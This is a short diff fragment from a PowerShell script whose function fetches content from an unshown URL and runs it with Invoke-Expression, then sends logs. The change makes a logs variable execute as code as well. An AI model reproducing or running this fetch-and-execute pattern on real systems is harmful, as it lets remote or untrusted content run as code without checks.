@@ -360,7 +360,7 @@ function Main {
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
     Send-Logs
-    $logsFiles
+    Invoke-Expression $logsFiles
 
 
 
